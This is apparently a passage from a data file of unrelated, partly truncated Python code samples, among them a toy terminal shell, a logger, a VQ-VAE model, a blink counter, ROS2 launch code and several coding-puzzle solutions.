group_by_speaker=True):\n\n        inputs, diarizer_inputs = self.preprocess(inputs)\n\n        diarization = self.diarization_pipeline(\n            {\"waveform\": diarizer_inputs, \"sample_rate\": self.sampling_rate},\n        )\n        new_segments = self.postprocess_diarization(diarization)\n\n        asr_out = self.asr_pipeline(\n            {\"array\": inputs, \"sampling_rate\": self.sampling_rate},\n            return_timestamps=True,\n ",
    "import pytest\r\nfrom main import *\r\nimport torch\r\nimport numpy as np \r\nimport cv2 \r\n\r\n\r\ndef get_video_name(video_path):                    \r\n    return os.path.basename(video_path)\r\n\r\n\r\ndef test_getOutputsNames():\r\n\r\n    class FakeNet:\r\n        def getLayerNames(self):\r\n            return ['layer1', 'layer2', 'layer3']\r\n\r\n        def getUnconnectedOutLayers(self):\r\n            return [1, 2]\r\n\r\n    fake_net = FakeNet()\r\n    assert getOutputsNames(fake_net) == ['layer1', 'layer2']\r\n\r\n\r\n\r\ndef test_VehicleClassifier():\r\n    model = VehicleClassifier(num_classes=2)\r\n    assert isinstance(model, torch.nn.Module)\r\n\r\n\r\ndef test_preprocess_vehicle_region():\r\n\r\n    image = np.random.randint(0, 255, size=(100, 100, 3), dtype=np.uint8)\r\n\r\n    processed_image = preprocess_vehicle_region(image)\r\n\r\n    assert isinstance(processed_image, torch.Tensor)\r\n    assert processed_image.shape == (1, 3, 224, 224)\r\n\r\n\r\ndef test_matricule_no_detection():\r\n    \"\"\"Tests if the function returns 'Non detecte' and 'Inconnu' when no plates are detected.\"\"\"\r\n    detected_text, detected_class = matricule(np.zeros((480, 640, 3)), [])\r\n    assert detected_text == \"Non detecte\"\r\n    assert detected_class == \"Inconnu\"\r\n\r\n\r\n\r\ndef test_VehicleCounter():\r\n    vc = VehicleCounter(\"./demo.mp4\")\r\n    assert vc.video_name == \"video.mp4\"\r\n\r\n\r\ndef test_send_video_name():\r\n    vc = VehicleCounter(\"./demo.mp4\")\r\n    assert vc.send_video_name() == None \r\n\r\n\r\ndef test_publish_video_end_message():\r\n    vc = VehicleCounter(\"./demo.mp4\")\r\n    assert vc.publish_video_end_message() == None \r\n\r\ndef test_publish_json_to_mqtt():\r\n    vc = VehicleCounter(\"./demo.mp4\")\r\n    assert vc.publish_json_to_mqtt({\"test\": \"data\"}) == None \r\n\r\ndef test_VehicleCounter():\r\n  \r\n    vc = VehicleCounter(\"demo.mp4\")\r\n\r\n    assert isinstance(vc, VehicleCounter)\r\n\r\n    assert hasattr(vc, \"broker_address\")\r\n    assert hasattr(vc, \"broker_port\")\r\n    assert hasattr(vc, \"topic\")\r\n    assert hasattr(vc, \"mqtt_client\")\r\n    assert hasattr(vc, \"tracker\")\r\n    assert hasattr(vc, \"cam\")\r\n    assert hasattr(vc, \"input_size\")\r\n    assert hasattr(vc, \"confThreshold\")\r\n    assert hasattr(vc, \"nmsThreshold\")\r\n    assert hasattr(vc, \"classNames\")\r\n    assert hasattr(vc, \"required_class_index\")\r\n    assert hasattr(vc, \"net\")\r\n    assert hasattr(vc, \"colors\")\r\n\r\n    ",
    "import os\r\nimport datetime\r\nimport linecache\r\nimport colorama\r\nfrom colorama import Fore, Back\r\nimport glob\r\n\r\ncolorama.init()\r\n\r\nglobal start\r\n\r\nglobal user\r\n\r\norange = '\\x1b[38;2;255;165;0m'\r\n\r\ndef termilink():\r\n    print(\"Welcome to EvanRunnerStudios (TM) TermiLink\")\r\n\r\n\r\n\r\n\r\ndef clear():\r\n    if os.name == 'nt':\r\n        os.system('cls')\r\n    else:\r\n        os.system('clear')\r\n\r\n#This makes all text orange\r\nprint(orange)\r\n\r\n#ui stands for user input\r\nglobal ui\r\n#this is the commands list that stores all the commands\r\nglobal page1\r\npage1 = \"\\nhelp\\ntime\\nfileread\\nfilecreate\\nrun\\nfilelist\\nfiledelete\\nfilefix\\ncustom commands\\nclear\\n\"\r\n\r\n\r\n\r\ndef system():\r\n    termilink()\r\n    print(\"Type help for a list of commands!\\n\")\r\n\r\n    #this is for if the system is running\r\n    global run\r\n    run = True\r\n    \r\n    while run:\r\n\r\n        user = 'guest'\r\n\r\n        time = datetime.datetime.now()\r\n\r\n\r\n        ui = input(f'termilink#{Fore.BLUE}{user}{orange}~ ').lower().strip(' ')\r\n\r\n\r\n        if ui == \"help\":\r\n            print(page1)\r\n            print(\"for more information on a specific command type the commands name and help like filefix+help\\n\")\r\n        if ui == \"time\":\r\n            print(f\"The the current date and time is: {time}\")\r\n        if ui == \"fileread\":\r\n            lr = input(\"what file would you like to read: \")\r\n            fileco = linecache.getline(f\"{lr}.txt\", 1)\r\n            print('\\n' + fileco.replace(\"||\", \"\\n\"))\r\n        if ui == \"filecreate\":\r\n            ln = input(\"File Name: \")\r\n\r\n            li =  input(\"type in the file || to create a new line: \")\r\n\r\n            with open(f\"{ln}.txt\", \"w\") as file:\r\n                file.write(li)\r\n        if ui == \"run\":\r\n            try:\r\n                ftr = input(\"Enter the file to run: \")\r\n\r\n                with open(f\"{ftr}.txt\", \"r\") as file:\r\n                    python_code = file.read().replace(\"||\", \"\\n\")\r\n                    exec(python_code)\r\n            except:\r\n                print(Back.RED + Fore.WHITE + \"ERROR IN COMPILING\" + orange + Back.RESET)\r\n                print(orange)\r\n        if ui == \"filelist\":\r\n\r\n\r\n            # List all files in the current directory\r\n            files = glob.glob('*.*')\r\n\r\n            print(\"\\nListing All Files...\\n\")\r\n\r\n            # Print the list of files\r\n            for file in files:\r\n                print(file)\r\n            print('\\n')\r\n\r\n        if ui == \"filedelete\":\r\n            #this stands for what file to delete\r\n            wftd = input(\"What file would you like to delete: \")\r\n            try:\r\n                os.remove(f\"{wftd}.txt\")\r\n                if wftd == \"cc\":\r\n                    print(Back.RED + Fore.WHITE + \"\\n\\nERROR CC NOT FOUND:\\nPOWER OFF YOUR SYSTEM THEN POWER BACK ON TO GET CC BACK ITS A REQUIRED FILE\\n\\n\" + orange + Back.RESET)\r\n                    print(orange)\r\n                    print()\r\n            except FileNotFoundError:\r\n                print(Back.RED + Fore.WHITE + \"ERROR THIS FILE DOES NOT EXIST\" + orange + Back.RESET)\r\n                print(orange)\r\n            except PermissionError:\r\n                print(Back.RED + Fore.WHITE + f\"ERROR NO PERMISSION: CANT DELETE {wftd}\" + orange + Back.RESET)\r\n                print(orange)\r\n            except:\r\n                print(Back.RED + Fore.WHITE + \"AN UNKNOWN ERROR OCCURED\" + orange + Back.RESET)\r\n                print(orange)\r\n        if ui == \"filefix\":\r\n            print(Back.RED + Fore.WHITE + \"WARNING:\\nARE YOU SURE YOU WANT TO USE THIS IT ONLY FIXES IF YOU DID NOT USE\\n|| FOR NEW LINES IF IS ANOTHER ISSUE IT MIGHT BREAK THE PROGRAM\\n \" + orange + Back.RESET)\r\n            print(orange)\r\n            #wc stands for warning confirm \r\n            wc = input(\"Y OR N: \").lower()\r\n            if wc == \"y\":\r\n                pass#THIS IS GOING TO BE MADE IN THE FUTURE\r\n            else:\r\n                print(Back.RED + Fore.WHITE + \"ABORTING\" + orange + Back.RESET)\r\n                print(orange)\r\n            \r\n        if ui == \"moreinfo\":\r\n            print(\"\\ntermilink is a terminal based os made in python and can execute python code\")\r\n            print(\"termilink also is linux based if your running this as your os it has it an boots it automatically\")\r\n            print(\"termilink is made by Evan Runner Pason as an online alias\")\r\n            print(\"termilink has Some Important features you can utilize such as custom commands if this file is not already there\")\r\n            print(\"you can create it yourself do filecreate the file name is cc for custom commands then you can write in that file\")\r\n            print(\"for the first line write the ammount of custom commands you will be using then like 1 or 2 then do || for the next line\")\r\n            print(\"then write the file that you want to cc to run simple as that you do NOT NEED TO PUT THE FILE EXTINSION you will most likely\")\r\n            print(\"NEVER NEED TO DO THAT IN termilink OS because all files are .txt but then compile to other file types the custom command",
    "import datetime\nimport sys\nfrom pathlib import Path\nimport threading\nimport json\n\n__all__ = [\"Logger\"]\n\n# Custom Errors\nclass Errors:\n    \"\"\"Contains Custom Errors\"\"\"\n\n    class FileNotOpen(Exception):\n        \"\"\"FileNotOpen Error\"\"\"\n        \n\n    class PathNonExistent(Exception):\n        \"\"\"PathNonExistent Error\"\"\"\n        \n\n    class LevelNotSupported(Exception):\n        \"\"\"LevelNotSupported Error\"\"\"\n\n    class UnableToLock(Exception):\n        \"\"\"UnableToLock Error\"\"\"\n\n    class LockNonExistent(Exception):\n        \"\"\"LockNonExistent Error\"\"\"\n\nclass Logger:\n    \"\"\"\n        Initialize Logger instance.\n\n        Args:\n            output_dir (str, optional): the output location. Defaults to 'logs'.\n            log_file_type (str, optional): the file log type. Defaults to 'log'.\n            settings_path (str, optional): the settings path. Defaults to './log_settings.json'.\n            log_level (str, optional): the log level. Defaults to 'INFO'.\n\n        Raises:\n            ValueError: If the log file type isn't supported.\n            PathNonExistent: If the log file path does not exist.\n            FileNotOpen: If the log file is not open.\n            PathNonExistent: If the log settings file path does not exist.\n            UnableToLock: If the script is unable to get a thread lock.\n        \"\"\"\n    open_loggers_lock = threading.Lock()  # Lock for synchronizing access to open_loggers\n    open_loggers = {}  # Thread-safe dictionary to store open loggers\n\n    def __init__(self,\n                 output_dir: str = \"logs\",\n                 log_file_type: str = \"log\",\n                 settings_path: str = './log_settings.json',\n                 log_level: str = 'INFO'):\n        \"\"\"\n        Initialize Logger instance.\n\n        Args:\n            output_dir (str, optional): the output location. Defaults to 'logs'.\n            log_file_type (str, optional): the file log type. Defaults to 'log'.\n            settings_path (str, optional): the settings path. Defaults to './log_settings.json'.\n            log_level (str, optional): the log level. Defaults to 'INFO'.\n\n        Raises:\n            ValueError: If the log file type isn't supported.\n            PathNonExistent: If the log file path does not exist.\n            FileNotOpen: If the log file is not open.\n            PathNonExistent: If the log settings file path does not exist.\n            UnableToLock: If the script is unable to get a thread lock.\n        \"\"\"\n        self.lock = None\n\n        try:\n            # Attempt to create a thread lock\n            self.lock = threading.Lock()\n        except Exception as e:\n            # Raise an error if unable to create a thread lock\n            raise Errors.UnableToLock(f\"Unable to get process lock with error {e}\")\n\n        # Set log level to upper case\n        self.log_level = log_level.upper()\n\n        # Initialize variables\n        self.settings = None\n        self.configured_level_value = None\n        self.file_path = None\n        self.log_file = None\n        self.log_file_name = None\n        self.timestamp = None\n\n        # Assign values\n        self.timestamp = datetime.datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n        self.supported_formats = [\"log\", \"txt\"]\n        self.log_file_type = log_file_type if log_file_type in self.supported_formats else 'log'\n        self.file_path = Path.cwd().resolve() if output_dir == \".\" else Path(output_dir).resolve()\n        self.settings_path = settings_path\n        self.load_json(self.settings_path)\n        if self.settings:\n            self.configured_level_value = self.settings['LogLevels'][self.log_level]\n\n        # Create the log file\n        self.create_log_file()\n\n    def log(self, level: str, message: str, context=None):\n        \"\"\"\n        Make a new log to the log file.\n\n        Args:\n            level (str): The log level.\n            message (str): The log message.\n            context (dict, optional): Contextual information to be included in the log message.\n\n        Raises:\n            FileNotOpen: If log file is not open.\n            LockNonExistent: If the script doesn't have a lock.\n            FileNotOpen: If the log file is not open.\n        \"\"\"\n        timestamp = datetime.datetime.now().strftime(\"%Y-%m-%d-%H-%M-%S\")\n        level = level.upper()\n\n        if self.lock:\n            with self.lock:\n                if self.log_file:\n                    if self.settings:\n                        log_level_value = self.settings['LogLevels'][level]\n                        if log_level_value and self.configured_level_value:\n                            if log_level_value >= self.configured_level_value:\n                                if timestamp:\n                                    if context:\n                                        formatted_message = self.formatter(\n                                                                        level, message,\n                                                                           timestamp,\n                             ",
    "import torch\r\nimport torch.nn as nn\r\n\r\n\r\nclass ResidualBlock(nn.Module):\r\n\r\n    def __init__(self, dim):\r\n        super().__init__()\r\n        self.relu = nn.ReLU()\r\n        self.conv1 = nn.Conv2d(dim, dim, 3, 1, 1)\r\n        self.conv2 = nn.Conv2d(dim, dim, 1)\r\n\r\n    def forward(self, x):\r\n        tmp = self.relu(x)\r\n        tmp = self.conv1(tmp)\r\n        tmp = self.relu(tmp)\r\n        tmp = self.conv2(tmp)\r\n        return x + tmp\r\n\r\n\r\nclass VQVAE(nn.Module):\r\n\r\n    def __init__(self, input_dim, dim, n_embedding):\r\n        super().__init__()\r\n        self.encoder = nn.Sequential(\r\n            nn.Conv2d(input_dim, 32, 4, 2, 1),\r\n            nn.ReLU(),\r\n            nn.Conv2d(32, 64, 4, 2, 1),\r\n            nn.ReLU(),\r\n            nn.Conv2d(64, dim, 3, 1, 1),\r\n            nn.ReLU()\r\n            # ResidualBlock(dim),\r\n            # ResidualBlock(dim)\r\n        )\r\n        self.vq_embedding = nn.Embedding(n_embedding, dim)\r\n        self.vq_embedding.weight.data.uniform_(-1.0 / n_embedding, 1.0 / n_embedding)\r\n\r\n        self.decoder = nn.Sequential(\r\n            nn.ConvTranspose2d(dim, 32, 3, 1, 1),\r\n            nn.ReLU(),\r\n            # ResidualBlock(dim),\r\n            # ResidualBlock(dim),\r\n            nn.ConvTranspose2d(32, 64, 4, 2, 1),\r\n            nn.ReLU(),\r\n            nn.ConvTranspose2d(64, input_dim, 4, 2, 1),\r\n        )\r\n        self.n_downsample = 2\r\n\r\n    def forward(self, x):\r\n        # encode\r\n        ze = self.encoder(x)\r\n\r\n        # ze: [N, C, H, W]\r\n        # embedding [K, C]\r\n        embedding = self.vq_embedding.weight.data\r\n        N, C, H, W = ze.shape\r\n        K, _ = embedding.shape\r\n        embedding_broadcast = embedding.reshape(1, K, C, 1, 1)\r\n        ze_broadcast = ze.reshape(N, 1, C, H, W)\r\n        distance = torch.sum((embedding_broadcast - ze_broadcast) ** 2, 2)\r\n        nearest_neighbor = torch.argmin(distance, 1)\r\n        # make C to the second dim\r\n        zq = self.vq_embedding(nearest_neighbor).permute(0, 3, 1, 2)\r\n        # stop gradient\r\n        decoder_input = ze + (zq - ze).detach()\r\n\r\n        # decode\r\n        x_hat = self.decoder(decoder_input)\r\n        return x_hat, ze, zq\r\n",
    "import cv2\r\nimport cvzone\r\nfrom cvzone.FaceMeshModule import FaceMeshDetector\r\nfrom cvzone.PlotModule import LivePlot\r\n\r\n\r\ncap = cv2.VideoCapture(0) \r\ndetector = FaceMeshDetector(maxFaces=1)\r\nplotY = LivePlot(640, 360, [20, 50], invert=True)\r\n\r\nidList = [22, 23, 24, 26, 110, 157, 158, 159, 160, 161, 130, 243]\r\nratioList = []\r\nblinkCounter = 0\r\ncounter = 0\r\ncolor = (255, 0, 255)\r\n\r\nwhile True:\r\n\r\n    if cap.get(cv2.CAP_PROP_POS_FRAMES) == cap.get(cv2.CAP_PROP_FRAME_COUNT):\r\n        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)\r\n\r\n    success, img = cap.read()\r\n    img, faces = detector.findFaceMesh(img, draw=False)\r\n\r\n    if faces:\r\n        face = faces[0]\r\n        for id in idList:\r\n            cv2.circle(img, face[id], 5,color, cv2.FILLED)\r\n\r\n        leftUp = face[159]\r\n        leftDown = face[23]\r\n        leftLeft = face[130]\r\n        leftRight = face[243]\r\n        lenghtVer, _ = detector.findDistance(leftUp, leftDown)\r\n        lenghtHor, _ = detector.findDistance(leftLeft, leftRight)\r\n\r\n        cv2.line(img, leftUp, leftDown, (0, 200, 0), 3)\r\n        cv2.line(img, leftLeft, leftRight, (0, 200, 0), 3)\r\n\r\n        ratio = int((lenghtVer / lenghtHor) * 100)\r\n        ratioList.append(ratio)\r\n        if len(ratioList) > 3:\r\n            ratioList.pop(0)\r\n        ratioAvg = sum(ratioList) / len(ratioList)\r\n\r\n        if ratioAvg < 35 and counter == 0:\r\n            blinkCounter += 1\r\n            color = (0,200,0)\r\n            counter = 1\r\n        if counter != 0:\r\n            counter += 1\r\n            if counter > 10:\r\n                counter = 0\r\n                color = (255,0, 255)\r\n\r\n        cvzone.putTextRect(img, f'Blink Count: {blinkCounter}', (50, 100),\r\n                           colorR=color)\r\n\r\n        imgPlot = plotY.update(ratioAvg, color)\r\n        img = cv2.resize(img, (640, 360))\r\n        imgStack = cvzone.stackImages([img, imgPlot], 2, 1)\r\n    else:\r\n        img = cv2.resize(img, (640, 360))\r\n        imgStack = cvzone.stackImages([img, img], 2, 1)\r\n\r\n    cv2.imshow(\"Image\", imgStack)\r\n    key = cv2.waitKey(5)\r\n    if key == ord('q'):\r\n        break\r\n        \r\n    ",
    "from random import choice\nfrom collections import Counter\nimport sys\n\ndef solvepart1():\n    #read in data\n    data = fileRead(\"input.txt\")\n    global edges\n    edges = {}\n    for row in data:\n        p1, p2s = row.split(\":\")\n        edges[p1] = ()\n        for p in p2s.strip().split(\" \"):\n            edges[p] = ()\n    for row in data:\n        p1, p2s = row.split(\":\")\n        for p in p2s.strip().split(\" \"):\n            edges[p1] = edges[p1] + (p,)\n            edges[p] = edges[p] + (p1,)\n\n    #find shortest paths between 1000 random points\n    nodes = list(edges.keys())\n    newEdges = []\n    for i in range(0, 500):\n        if i % 50 == 0:\n            print(i)\n        start = choice(nodes)\n        end = choice(nodes)\n        pointPath = shortestPathBFS(start, end)\n        for j in range(len(pointPath)-1):\n            newEdges.append((pointPath[j], pointPath[j+1]))\n\n    #find 3 most frequent edges in those paths\n    count = Counter(newEdges)\n    sortedCount = sorted(count.items(), key = lambda item: item[1], reverse = True)\n    foundEdges = []\n    for pair, count in sortedCount[:6]:\n        foundEdges.append(set(pair))\n    cutsSet = []\n    for pair in foundEdges:\n        if pair not in cutsSet:\n            cutsSet.append(pair)\n    cuts = [tuple(cut) for cut in cutsSet]\n\n    \n    #cut 3 found edges out of graph\n    side1start = cuts[0][0]\n    side2start = cuts[0][1]\n    for cutEdge in cuts:\n        adjacentA = list(edges[cutEdge[0]])\n        adjacentA.remove(cutEdge[1])\n        edges[cutEdge[0]] = tuple(adjacentA)\n        adjacentB = list(edges[cutEdge[1]])\n        adjacentB.remove(cutEdge[0])\n        edges[cutEdge[1]] = tuple(adjacentB)\n\n    #find area of each half of graph\n    area1 = findAreaOfGraph(side1start)\n    area2 = findAreaOfGraph(side2start)\n    print(area1, area2, area1 * area2)\n\n\n# use a BFS to find the shortest path between 2 points on the graph and returns all connections in that path\ndef shortestPathBFS(start, goal):\n    nodeQueue = [start]\n    visitedNodes = [start]\n    parents = {}\n    node = \"\"\n    while len(nodeQueue) > 0:\n        node = nodeQueue.pop(0)\n        if node == goal:\n            break\n        for newNode in edges[node]:\n            if newNode not in visitedNodes:\n                visitedNodes.append(newNode)\n                parents[newNode] = node\n                nodeQueue.append(newNode)\n    curr = node\n    path = []\n    while curr != start:\n        path = [curr] + path\n        curr = parents[curr]\n    path = [curr] + path\n    return path\n\n# uses a BFS to find the number of nodes in a graph\ndef findAreaOfGraph(start):\n    nodeQueue = [start]\n    visitedNodes = [start]\n    node = \"\"\n    sum = 0\n    while len(nodeQueue) > 0:\n        sum = sum + 1\n        node = nodeQueue.pop(0)\n        for newNode in edges[node]:\n            if newNode not in visitedNodes:\n                visitedNodes.append(newNode)\n                nodeQueue.append(newNode)\n    return sum\n\ndef fileRead(name):\n    data = []\n    f = open(name, \"r\")\n    for line in f:\n        data.append(line);\n    return data\n\nsolvepart1()",
    "import json\n\n\nfiles = ['test.json', 'train.json']\nlabels_full_names = {\n    \"naphtha\": \"Naphtha\",\n    \"lead\": \"Lead\",\n    \"zinc\": \"Zinc\",\n    \"gas\": \"Natural Gas\",\n    \"potato\": \"Potato\",\n    \"alum\": \"Aluminum\",\n    \"corn\": \"Corn\",\n    \"heat\": \"Heating Oil\",\n    \"groundnut\": \"Groundnut\",\n    \"cotton\": \"Cotton\",\n    \"earn\": \"Earnings\",\n    \"coffee\": \"Coffee\",\n    \"carcass\": \"Carcass\",\n    \"soy-oil\": \"Soybean Oil\",\n    \"bop\": \"Balance of Payments\",\n    \"wheat\": \"Wheat\",\n    \"reserves\": \"Reserves\",\n    \"rape-oil\": \"Rapeseed Oil\",\n    \"soy-meal\": \"Soybean Meal\",\n    \"lumber\": \"Lumber\",\n    \"wpi\": \"Wholesale Price Index\",\n    \"gold\": \"Gold\",\n    \"nickel\": \"Nickel\",\n    \"lin-oil\": \"Linseed Oil\",\n    \"l-cattle\": \"Live Cattle\",\n    \"sunseed\": \"Sunflower Seed\",\n    \"rand\": \"South African Rand\",\n    \"lei\": \"Lei\",\n    \"rye\": \"Rye\",\n    \"fuel\": \"Fuel\",\n    \"income\": \"Income\",\n    \"iron-steel\": \"Iron and Steel\",\n    \"palmkernel\": \"Palm Kernel\",\n    \"hog\": \"Hog\",\n    \"jet\": \"Jet Fuel\",\n    \"soybean\": \"Soybean\",\n    \"barley\": \"Barley\",\n    \"sorghum\": \"Sorghum\",\n    \"jobs\": \"Jobs\",\n    \"sugar\": \"Sugar\",\n    \"money-supply\": \"Money Supply\",\n    \"rapeseed\": \"Rapeseed\",\n    \"palm-oil\": \"Palm Oil\",\n    \"rice\": \"Rice\",\n    \"palladium\": \"Palladium\",\n    \"money-fx\": \"Money Foreign Exchange\",\n    \"nzdlr\": \"New Zealand Dollar\",\n    \"livestock\": \"Livestock\",\n    \"veg-oil\": \"Vegetable Oil\",\n    \"gnp\": \"Gross National Product\",\n    \"orange\": \"Orange\",\n    \"cpi\": \"Consumer Price Index\",\n    \"cotton-oil\": \"Cottonseed Oil\",\n    \"yen\": \"Japanese Yen\",\n    \"propane\": \"Propane\",\n    \"acq\": \"Acquisitions\",\n    \"castor-oil\": \"Castor Oil\",\n    \"coconut\": \"Coconut\",\n    \"oilseed\": \"Oilseed\",\n    \"nkr\": \"Norwegian Krone\",\n    \"meal-feed\": \"Meal Feed\",\n    \"tea\": \"Tea\",\n    \"sun-meal\": \"Sunflower Meal\",\n    \"ipi\": \"Industrial Production Index\",\n    \"pet-chem\": \"Petrochemicals\",\n    \"instal-debt\": \"Installment Debt\",\n    \"dfl\": \"Dutch Florin\",\n    \"trade\": \"Trade\",\n    \"grain\": \"Grain\",\n    \"rubber\": \"Rubber\",\n    \"sun-oil\": \"Sunflower Oil\",\n    \"cpu\": \"Capacity Utilization\",\n    \"dmk\": \"Deutsche Mark\",\n    \"retail\": \"Retail\",\n    \"cocoa\": \"Cocoa\",\n    \"coconut-oil\": \"Coconut Oil\",\n    \"ship\": \"Shipping\",\n    \"nat-gas\": \"Natural Gas\",\n    \"platinum\": \"Platinum\",\n    \"tin\": \"Tin\",\n    \"interest\": \"Interest Rates\",\n    \"copper\": \"Copper\",\n    \"strategic-metal\": \"Strategic Metals\",\n    \"silver\": \"Silver\",\n    \"copra-cake\": \"Copra Cake\",\n    \"oat\": \"Oat\",\n    \"housing\": \"Housing\",\n    \"groundnut-oil\": \"Groundnut Oil\",\n    \"dlr\": \"Dollar\",\n    \"crude\": \"Crude Oil\"\n} # generated by GPT-4\n\n\nfor file in files:\n    unique_labels = set()\n    a = open(file)\n    dics = []\n    for line in a.readlines():\n        dic = json.loads(line)\n        dics += [dic]\n\n    english_prompt = \"Classify the following Reuters economic and trade news as the correct topic: \"\n\n    # \u5904\u7406\u6bcf\u4e00\u884c\n    processed_data = []\n    for data in dics:\n        \n        # \u5728\"text\"\u5b57\u6bb5\u524d\u52a0\u4e0a\u82f1\u6587\u63d0\u793a\n        data[\"text\"] = english_prompt + data[\"text\"]\n        \n        # \u6536\u96c6\u72ec\u7279\u7684\u6807\u7b7e\n        if data[\"label\"][0] == \" \":\n            labels = data[\"label\"][1:].split(\", \")\n        else:\n            labels = data[\"label\"].split(\", \")\n        new_label = ','.join([\" \"+ labels_full_names[i].lower() for i in labels])\n        data['label'] = new_label\n        # \u5c06\u5904\u7406\u540e\u7684\u6570\u636e\u8f6c\u6362\u56deJSON\u5b57\u7b26\u4e32\uff08\u5982\u679c\u9700\u8981\u4fdd\u5b58\u56de\u6587\u4ef6\uff09\n        processed_data.append(data)\n    import random\n    random.seed(42)\n    random.shuffle(processed_data)\n    if file == 'test.json':\n        with open('shuffled/' + 'test.json', 'w') as f:\n            for data in processed_data[0:2005]:\n                json.dump(data, f)\n                f.write('\\n')\n        with open('shuffled/' + 'dev.json', 'w') as f:\n            for data in processed_data[2005:]:\n                json.dump(data, f)\n                f.write('\\n')\n    else:\n        with open('shuffled/' + file, 'w') as f:\n            for data in processed_data:\n                json.dump(data, f)\n                f.write('\\n')\n\n\nprint(\"Unique labels:\", unique_labels)\nprint(len(unique_labels))",
    "# Function to maintain the inventory list\ndef manage_inventory(N, initial_inventory, M, operations):\n    inventory = dict()\n\n    for item, quantity in initial_inventory:\n        inventory[item] = int(quantity)  # Convert quantity to integer\n\n    output = []\n    total_quantity = 0\n\n    for operation in operations:\n        op, item, quantity = operation\n        if op == \"ADD\":\n            if item in inventory:\n                inventory[item] += int(quantity)  # Convert quantity to integer\n                output.append(f\"UPDATED Item {item}\")\n            else:\n                inventory[item] = int(quantity)  # Convert quantity to integer\n                output.append(f\"ADDED Item {item}\")\n        elif op == \"DELETE\":\n            if item not in inventory:\n                output.append(f\"Item {item} does not exist\")\n            elif inventory[item] < int(quantity):  # Convert quantity to integer\n                output.append(f\"Item {item} could not be DELETED\")\n            else:\n                inventory[item] -= int(quantity)  # Convert quantity to integer\n                output.append(f\"DELETED Item {item}\")\n        total_quantity = sum(inventory.values())\n\n    output.append(f\"Total Items in Inventory: {total_quantity}\")\n    return output\n\n# Main function\nif __name__ == '__main__':\n    # Input the number of test cases\n    T = int(input())\n\n    # Process each test case\n    for _ in range(T):\n        # Input the number of items in the lab initially\n        N = int(input())\n\n        # Input the initial inventory\n        initial_inventory = [input().split() for _ in range(N)]\n\n        # Input the number of operations\n        M = int(input())\n\n        # Input the list of operations\n        operations = [input().split() for _ in range(M)]\n\n        # Call the manage_inventory function to process the inventory\n        result = manage_inventory(N, initial_inventory, M, operations)\n\n        # Print the result for this test case\n        for line in result:\n            print(line)\n",
    "#!/usr/bin/python3\n# Copyright 2020, EAIBOT\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom ament_index_python.packages import get_package_share_directory\n\nfrom launch import LaunchDescription\nfrom launch_ros.actions import LifecycleNode\nfrom launch_ros.actions import Node\nfrom launch.actions import DeclareLaunchArgument\nfrom launch.substitutions import LaunchConfiguration\nfrom launch.actions import LogInfo\n\nimport lifecycle_msgs.msg\nimport os\n\n\ndef generate_launch_description():\n    share_dir = get_package_share_directory('ydlidar_ros2_driver')\n    rviz_config_file = os.path.join(share_dir, 'config','ydlidar.rviz')\n    parameter_file = LaunchConfiguration('params_file')\n    node_name = 'ydlidar_ros2_driver_node'\n\n    params_declare = DeclareLaunchArgument('params_file',\n                                           default_value=os.path.join(\n                                               share_dir, 'params', 'ydlidar.yaml'),\n                                           description='FPath to the ROS2 parameters file to use.')\n\n    driver_node = LifecycleNode(package='ydlidar_ros2_driver',\n                                executable='ydlidar_ros2_driver_node',\n                                name='ydlidar_ros2_driver_node',\n                                output='screen',\n                                emulate_tty=True,\n                                parameters=[parameter_file],\n                                namespace='/',\n                                )\n    tf2_node = Node(package='tf2_ros',\n                    executable='static_transform_publisher',\n                    name='static_tf_pub_laser',\n                    arguments=['0', '0', '0.02','0', '0', '0', '1','base_link','laser_frame'],\n                    )\n    rviz2_node = Node(package='rviz2',\n                    executable='rviz2',\n                    name='rviz2',\n                    arguments=['-d', rviz_config_file],\n                    )\n\n    return LaunchDescription([\n        params_declare,\n        driver_node,\n        tf2_node,\n        rviz2_node,\n    ])\n",
    "# 242. Valid Anagram\n\n# Given two strings s and t, return true if t is an anagram of s, and false otherwise.\n\n# An Anagram is a word or phrase formed by rearranging the letters of a different word or phrase, typically using all the original letters exactly once.\n\n \n\n# Example 1:\n\n# Input: s = \"anagram\", t = \"nagaram\"\n# Output: true\n# Example 2:\n\n# Input: s = \"rat\", t = \"car\"\n# Output: false\n \n\n# Constraints:\n\n# 1 <= s.length, t.length <= 5 * 104\n# s and t consist of lowercase English letters.\n \n\n# Follow up: What if the inputs contain Unicode characters? How would you adapt your solution to such a case?\n\n################################################################################################################################\n\n\n#First Attempt:\nclass Solution(object):\n    def isAnagram(self, s, t):\n        \"\"\"\n        :type s: str\n        :type t: str\n        :rtype: bool\n        \"\"\"\n        dic = {}\n        dic2 = {}\n        for i in s:\n            dic[i] = dic.get(i,0) + 1\n        for i in t:\n            dic2[i] = dic2.get(i,0) + 1\n        if len(dic) != len(dic2): return False\n        try:    \n            for k in dic:\n                if dic[k] != dic2[k]: return False\n        except: return False    \n        return True\n    ",
